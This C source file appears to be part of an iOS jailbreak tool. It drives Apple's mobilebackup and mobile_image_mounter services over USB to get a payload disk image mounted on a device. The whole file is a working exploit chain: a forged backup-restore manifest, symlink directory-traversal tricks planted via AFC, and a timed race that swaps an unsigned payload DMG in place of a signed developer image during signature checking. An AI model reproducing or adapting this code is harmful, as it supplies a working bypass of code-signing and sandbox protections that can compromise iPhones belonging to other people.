#include "device.h"
#include "afc.h"
#include "util.h"
#include "mount.h"

static CFTypeRef mb_send_msg(void *service, CFTypeRef data) {
    CFTypeRef status = NULL;
    if (AMDServiceConnectionSendMessage(service, data, kCFPropertyListBinaryFormat_v1_0) != 0) return NULL;
    if (AMDServiceConnectionReceiveMessage(service, &status, NULL) != 0 || status == NULL) return NULL;
    if (CFGetTypeID(status) != CFArrayGetTypeID()) return NULL;
    
    CFRetain(status);
    return status;
}

static void *mb_open_service(am_device_t *device) {
    void *service = md_open_secure_service(device, "com.apple.mobilebackup");
    if (service == NULL) return NULL;

    CFTypeRef reply = NULL;
    if (AMDServiceConnectionReceiveMessage(service, &reply, NULL) != 0 || reply == NULL) return NULL;
    if (CFGetTypeID(reply) != CFArrayGetTypeID() || CFArrayGetCount(reply) < 3) return NULL;

    CFNumberRef version = CFArrayGetValueAtIndex(reply, 1);
    if (CFGetTypeID(version) != CFNumberGetTypeID() || !CFEqual(version, CFNUM(100))) return NULL;

    CFMutableArrayRef request = CFArrayCreateMutable(NULL, 0, NULL);
    CFArrayAppendValue(request, CFSTR("DLMessageVersionExchange"));
    CFArrayAppendValue(request, CFSTR("DLVersionsOk"));
    CFArrayAppendValue(request, CFNUM(300));

    if ((reply = mb_send_msg(service, request)) == NULL) return NULL;
    if (CFArrayGetCount(reply) < 1) return NULL;

    CFStringRef status = CFArrayGetValueAtIndex(reply, 0);
    if (CFGetTypeID(status) != CFStringGetTypeID() || !CFEqual(status, CFSTR("DLMessageDeviceReady"))) return NULL;
    return service;
}

static void create_manifest_file(CFMutableDictionaryRef file_list, CFStringRef path, uint32_t uid, uint32_t gid) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(dict, CFSTR("Domain"), CFSTR("MediaDomain"));
    CFDictionarySetValue(dict, CFSTR("Greylist"), kCFBooleanFalse);
    CFDictionarySetValue(dict, CFSTR("Path"), path);
    CFDictionarySetValue(dict, CFSTR("Version"), CFSTR("3.0"));

    char path_cstr[1024] = {0};
    CFStringGetCString(path, path_cstr, 1024-1, kCFStringEncodingUTF8);

    void *ctx = sha1_init();
    sha1_update(ctx, path_cstr, strlen(path_cstr));
    sha1_update(ctx, ";", 1);
    sha1_update(ctx, "false", 5);
    sha1_update(ctx, ";", 1);
    sha1_update(ctx, "MediaDomain", 11);
    sha1_update(ctx, ";", 1);
    sha1_update(ctx, "(null)", 6);
    sha1_update(ctx, ";", 1);
    sha1_update(ctx, "3.0", 3);
    sha1_update(ctx, ";", 1);

    CFMutableDictionaryRef integrity_info = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    uint8_t *hash = sha1_final(ctx);

    CFDictionarySetValue(integrity_info, CFSTR("DataHash"), CFDataCreate(NULL, (const uint8_t *)hash, CC_SHA1_DIGEST_LENGTH));
    CFDictionarySetValue(integrity_info, CFSTR("Domain"), CFSTR("MediaDomain"));
    CFDictionarySetValue(integrity_info, CFSTR("FileLength"), CFNUM(0));
    CFDictionarySetValue(integrity_info, CFSTR("Group ID"), CFNUM(gid));
    CFDictionarySetValue(integrity_info, CFSTR("Mode"), CFNUM(0755));
    CFDictionarySetValue(integrity_info, CFSTR("User ID"), CFNUM(uid));
    free(hash);

    char domain_path[1024] = {0};
    snprintf(domain_path, 1024-1, "MediaDomain-%s", path_cstr);

    char *hash_str = sha1_calculate_to_str(domain_path, strlen(domain_path));
    CFStringRef hash_cfstr = CFStringCreateWithCString(NULL, hash_str, kCFStringEncodingUTF8);
    CFDictionarySetValue(file_list, hash_cfstr, integrity_info);
    free(hash_str);
}

static CFDictionaryRef create_backup_manifest(am_device_t *device) {
    CFMutableDictionaryRef data = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(data, CFSTR("DeviceICCID"), CFSTR(""));
    CFDictionarySetValue(data, CFSTR("DeviceId"), AMDeviceCopyValue(device, NULL, CFSTR("UniqueDeviceID")));
    CFDictionarySetValue(data, CFSTR("Version"), CFSTR("6.2"));
    CFDictionarySetValue(data, CFSTR("Applications"), CFDictionaryCreateMutable(NULL, 0, NULL, NULL));

    CFMutableDictionaryRef file_list = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    create_manifest_file(file_list, CFSTR("Media/PhotoData/c"), 501, 501);
    create_manifest_file(file_list, CFSTR("Media/PhotoData/c/mobile_image_mounter"), 0, 0);
    CFDictionarySetValue(data, CFSTR("Files"), file_list);

    CFDataRef bplist = CFPropertyListCreateData(NULL, data, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
    uint8_t hash[CC_SHA1_DIGEST_LENGTH] = {0};
    CC_SHA1(CFDataGetBytePtr(bplist), CFDataGetLength(bplist), hash);

    CFMutableDictionaryRef manifest = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(manifest, CFSTR("AuthSignature"), CFDataCreate(NULL, (const uint8_t *)hash, CC_SHA1_DIGEST_LENGTH));
    CFDictionarySetValue(manifest, CFSTR("AuthVersion"), CFSTR("2.0"));
    CFDictionarySetValue(manifest, CFSTR("Data"), bplist);
    CFDictionarySetValue(manifest, CFSTR("IsEncrypted"), kCFBooleanFalse);
    return (CFDictionaryRef)manifest;
}

static CFArrayRef create_backup_payload(am_device_t *device) {
    CFDictionaryRef manifest = create_backup_manifest(device);
    CFMutableDictionaryRef info = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);

    CFDictionarySetValue(info, CFSTR("BackupManifestKey"), manifest);
    CFDictionarySetValue(info, CFSTR("BackupMessageRestoreMigrateKey"), CFSTR("Migrate"));
    CFDictionarySetValue(info, CFSTR("BackupMessageTypeKey"), CFSTR("kBackupMessageRestoreRequest"));
    CFDictionarySetValue(info, CFSTR("BackupNotifySpringBoard"), kCFBooleanFalse);
    CFDictionarySetValue(info, CFSTR("BackupPreserveCameraRoll"), kCFBooleanTrue);
    CFDictionarySetValue(info, CFSTR("BackupPreserveSettings"), kCFBooleanTrue);
    CFDictionarySetValue(info, CFSTR("BackupProtocolVersion"), CFSTR("1.7"));
    CFDictionarySetValue(info, CFSTR("BackupRestoreSystemFiles"), kCFBooleanFalse);

    CFMutableArrayRef payload = CFArrayCreateMutable(NULL, 0, NULL);
    CFArrayAppendValue(payload, CFSTR("DLMessageProcessMessage"));
    CFArrayAppendValue(payload, info);
    return (CFArrayRef)payload;
}

static CFArrayRef create_file_payload(CFStringRef path, CFStringRef target) {
    CFMutableDictionaryRef file = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(file, CFSTR("Domain"), CFSTR("MediaDomain"));
    CFDictionarySetValue(file, CFSTR("Greylist"), kCFBooleanFalse);
    CFDictionarySetValue(file, CFSTR("Path"), path);
    CFDictionarySetValue(file, CFSTR("Version"), CFSTR("3.0"));

    CFMutableDictionaryRef attr = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(attr, CFSTR("DeviceIdentifier"), CFNUM(2));
    CFDictionarySetValue(attr, CFSTR("DeviceType"), CFNUM(2));
    CFDictionarySetValue(attr, CFSTR("FileMode"), CFNUM(-32330));
    CFDictionarySetValue(attr, CFSTR("FileSize"), CFNUM(0));
    CFDictionarySetValue(attr, CFSTR("FileSystemFileNumber"), CFNUM(-2118778880));
    CFDictionarySetValue(attr, CFSTR("Filename"), CFSTR("Filename"));
    CFDictionarySetValue(attr, CFSTR("GroupOwnerAccountID"), CFNUM(0));
    CFDictionarySetValue(attr, CFSTR("LinkCount"), CFNUM(1));
    CFDictionarySetValue(attr, CFSTR("OwnerAccountID"), CFNUM(0));

    CFMutableDictionaryRef item = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(item, CFSTR("AuthVersion"), CFSTR("1.0"));
    CFDictionarySetValue(item, CFSTR("DLFileAttributesKey"), attr);
    CFDictionarySetValue(item, CFSTR("DLFileDest"), target);
    CFDictionarySetValue(item, CFSTR("DLFileIsEncrypted"), CFNUM(0));
    CFDictionarySetValue(item, CFSTR("DLFileOffsetKey"), CFNUM(0));
    CFDictionarySetValue(item, CFSTR("DLFileSource"), CFSTR("Filename"));
    CFDictionarySetValue(item, CFSTR("DLFileStatusKey"), CFNUM(2));
    CFDictionarySetValue(item, CFSTR("IsEncrypted"), kCFBooleanFalse);

    CFDataRef metadata = CFPropertyListCreateData(NULL, file, kCFPropertyListBinaryFormat_v1_0, 0, NULL);
    CFDictionarySetValue(item, CFSTR("Metadata"), metadata);
    CFDictionarySetValue(item, CFSTR("StorageVersion"), CFSTR("1.0"));
    CFDictionarySetValue(item, CFSTR("Version"), CFSTR("3.0"));

    CFMutableArrayRef payload = CFArrayCreateMutable(NULL, 0, NULL);
    CFArrayAppendValue(payload, CFSTR("DLSendFile"));
    CFArrayAppendValue(payload, CFDataCreate(NULL, NULL, 0));
    CFArrayAppendValue(payload, item);
    return (CFArrayRef)payload;
}

static int send_backup_payload(am_device_t *device, void *service) {
    CFArrayRef backup_payload = create_backup_payload(device);
    CFArrayRef reply = mb_send_msg(service, backup_payload);
    if (reply == NULL) return -1;

    CFStringRef type = CFArrayGetValueAtIndex(reply, 0);
    if (type == NULL || CFGetTypeID(type) != CFStringGetTypeID()) return -1;
    if (!CFEqual(type, CFSTR("DLMessageProcessMessage"))) return -1;

    CFDictionaryRef msg = CFArrayGetValueAtIndex(reply, 1);
    if (msg == NULL || CFGetTypeID(msg) != CFDictionaryGetTypeID()) return -1;

    CFStringRef status = CFDictionaryGetValue(msg, CFSTR("BackupMessageTypeKey"));
    if (status == NULL || CFGetTypeID(status) != CFStringGetTypeID()) return -1;
    if (!CFEqual(status, CFSTR("BackupMessageRestoreReplyOK"))) return -1;

    usleep(10000);
    return 0;
}

static int send_file_payload(am_device_t *device, void *service, const char *path, const char *target) {
    CFStringRef cf_path = CFStringCreateWithCString(NULL, path, kCFStringEncodingUTF8);
    CFStringRef cf_target = CFStringCreateWithCString(NULL, target, kCFStringEncodingUTF8);

    CFArrayRef file_payload = create_file_payload(cf_path, cf_target);
    CFArrayRef reply = mb_send_msg(service, file_payload);
    if (reply == NULL) return -1;

    CFStringRef type = CFArrayGetValueAtIndex(reply, 0);
    if (type == NULL || CFGetTypeID(type) != CFStringGetTypeID()) return -1;
    if (!CFEqual(type, CFSTR("DLMessageProcessMessage"))) return -1;

    CFDictionaryRef msg = CFArrayGetValueAtIndex(reply, 1);
    if (msg == NULL || CFGetTypeID(msg) != CFDictionaryGetTypeID()) return -1;

    CFStringRef status = CFDictionaryGetValue(msg, CFSTR("BackupMessageTypeKey"));
    if (status == NULL || CFGetTypeID(status) != CFStringGetTypeID()) return -1;
    if (!CFEqual(status, CFSTR("BackupMessageRestoreFileReceived"))) return -1;

    usleep(10000);
    return 0;
}

static int init_image_mounter(am_device_t *device, device_info_t *device_info, afc_info_t *afc_info) {
    afc_delete_item(afc_info, "PublicStaging");
    afc_create_dir(afc_info, "PublicStaging");
    if (device_info->version[0] == 6) return 0;

    afc_delete_item(afc_info, "aquila_e");
    afc_delete_item(afc_info, "aquila_m");
    afc_create_dir(afc_info, "PublicStaging/cache/haxx");
    afc_create_dir(afc_info, "aquila_e/a/b/c");
    afc_create_dir(afc_info, "aquila_e/var/mobile/Media/PublicStaging/cache");
    afc_create_dir(afc_info, "aquila_m/a/b/c/d/e/f/g");
    afc_create_dir(afc_info, "aquila_m/private/var");

    afc_file_ref_t file = afc_create_file(afc_info, "aquila_e/var/mobile/Media/PublicStaging/cache/haxx");
    if (file == NULL) return -1;
    afc_close_file(afc_info, file);
    afc_create_symlink(afc_info, "../../../var/mobile/Media/PublicStaging/cache/haxx", "aquila_e/a/b/c/c");

    file = afc_create_file(afc_info, "aquila_m/private/var/run");
    if (file == NULL) return -1;
    afc_close_file(afc_info, file);
    afc_create_symlink(afc_info, "../../../../../../../private/var/run", "aquila_m/a/b/c/d/e/f/g/c");

    void *mb_service = mb_open_service(device);
    if (mb_service == NULL) return -1;

    if (send_backup_payload(device, mb_service) != 0) return -1;
    if (send_file_payload(device, mb_service, "Media/PhotoData/c", "/var/mobile/Media/aquila_m/a/b/c/d/e/f/g/c") != 0) return -1;
    if (send_file_payload(device, mb_service, "Media/PhotoData/c/mobile_image_mounter", "/var/mobile/Media/aquila_e/a/b/c/c") != 0) return -1;

    usleep(100000);
    return 0;
}

static int upload_dmg_payload(afc_info_t *afc_info, device_info_t *device_info, uint32_t delay) {
    CFMutableDictionaryRef dict = CFDictionaryCreateMutable(NULL, 0, NULL, NULL);
    CFDictionarySetValue(dict, CFSTR("Command"), CFSTR("MountImage"));
    CFDictionarySetValue(dict, CFSTR("ImageType"), CFSTR("Developer"));

    if (device_info->version[0] == 6) {
        afc_delete_item(afc_info, "PublicStaging");
        afc_create_dir(afc_info, "PublicStaging");
        if (afc_upload_embed_file(afc_info, "__stock_dmg", "PublicStaging/staging.dimage") != 0) return -1;
        if (afc_upload_embed_file(afc_info, "__payload_dmg", "PublicStaging/payload.dimage") != 0) return -1;
        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/staging.dimage"));
    } else {
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/developer.dimage");
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/payload.dimage");
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/old.dimage");
        if (afc_upload_embed_file(afc_info, "__stock_dmg", "PublicStaging/cache/haxx/developer.dimage") != 0) return -1;
        if (afc_upload_embed_file(afc_info, "__payload_dmg", "PublicStaging/cache/haxx/payload.dimage") != 0) return -1;
        CFDictionarySetValue(dict, CFSTR("ImagePath"), CFSTR("/var/mobile/Media/PublicStaging/cache/haxx/developer.dimage"));
    }

    size_t signature_size = 0;
    void *signature_data = load_embed_file("__signature", &signature_size);
    if (signature_data == NULL) {
        CFRelease(dict);
        return -1;
    }

    CFDataRef cf_signature = CFDataCreate(NULL, signature_data, signature_size);
    CFDictionarySetValue(dict, CFSTR("ImageSignature"), cf_signature);
    void *service = md_open_secure_service(afc_info->device, "com.apple.mobile.mobile_image_mounter");
    if (service == NULL) {
        CFRelease(cf_signature);
        CFRelease(dict);
        return -1;
    }

    AMDServiceConnectionSendMessage(service, dict, kCFPropertyListXMLFormat_v1_0);
    usleep(delay);

    if (device_info->version[0] == 6) {
        AFCRenamePath(afc_info->connection, "PublicStaging/payload.dimage", "PublicStaging/staging.dimage");
    } else {
        AFCRenamePath(afc_info->connection, "PublicStaging/cache/haxx/developer.dimage", "PublicStaging/cache/haxx/old.dimage");
        AFCRenamePath(afc_info->connection, "PublicStaging/cache/haxx/payload.dimage", "PublicStaging/cache/haxx/developer.dimage");
    }

    CFRelease(cf_signature);
    CFRelease(dict);
    CFDictionaryRef status = NULL;

    AMDServiceConnectionReceiveMessage(service, &status, NULL);
    CFRelease(service);
    if (status == NULL) return -1;

    CFStringRef status_str = CFDictionaryGetValue(status, CFSTR("Status"));
    if (status_str != NULL) {
        if (CFEqual(status_str, CFSTR("Complete"))) {
            CFRelease(status);
            return 0;
        }
    }

    CFRelease(status);
    return -1;
}

int mount_dmg_payload(am_device_t *device, device_info_t *device_info, afc_info_t *afc_info) {
    uint32_t upload_delay = 1000;
    bool upload_done = false;
    int upload_tries = 1;

    if (init_image_mounter(device, device_info, afc_info) != 0) return -1;
    for (; upload_tries < 100; upload_tries++) {
        if (upload_dmg_payload(afc_info, device_info, upload_delay) == 0) {
            upload_done = true;
            break;
        }

        print_log(VERBOSE, "retrying dmg payload upload (attempt #%d)\n", upload_tries);
        upload_delay += 100;
    }

    if (device_info->version[0] == 6) {
        afc_delete_item(afc_info, "PublicStaging/stock.dimage");
        afc_delete_item(afc_info, "PublicStaging/payload.dimage");
    } else {
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/developer.dimage");
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/payload.dimage");
        afc_delete_item(afc_info, "PublicStaging/cache/haxx/old.dimage");
    }
    return upload_done ? 0 : -1;
}